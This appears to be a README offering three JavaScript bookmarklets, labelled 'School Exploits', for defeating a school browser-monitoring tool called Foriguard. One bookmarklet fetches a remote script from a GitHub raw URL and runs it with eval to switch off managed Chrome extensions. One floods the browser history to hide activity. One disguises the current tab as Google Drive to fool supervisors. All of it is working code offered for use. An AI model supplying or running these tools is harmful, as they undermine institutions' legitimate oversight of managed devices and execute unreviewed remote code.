# Bookmarklets
A Bunch Of Bookmarklets That Work With Foriguard!



## School Exploits

### Extension Modifier
---
This Bookmarklet Allows The User To Turn On Or Off
Their Chrome Extensions.

```javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);```

This One Requires You To Open It Twice In The Same Tab!

### History Flooder
---
This Bookmarklet Allows The User To Flood Their
History With Whatever Tab They Are On.

```javascript:var num=prompt("History flood amount:");done=false;x=window.location.href;for (var i=1; i<=num; i++){history.pushState(0, 0, i==num?x:i.toString());if(i==num){done=true}}if(done===true){alert("History flood successful! "+window.location.href+" now appears in your history "+num+(num==1?" time.":" times."))}```

### Tab Disguise
---
This Bookmarklet Disguises The Tab You Are On To Look
Like Google Drive.

```javascript:function gcloak() { var link = document.querySelector("link[rel*='icon']") || document.createElement('link');link.type = 'image/x-icon';link.rel = 'shortcut icon';link.href = 'https://www.pngall.com/wp-content/uploads/9/Google-Drive-Logo-Transparent-180x180.png';document.title = 'My Drive - Google Drive';console.log(document.title);document.getElementsByTagName('head')[0].appendChild(link) };gcloak();setInterval(gcloak, 1000);```



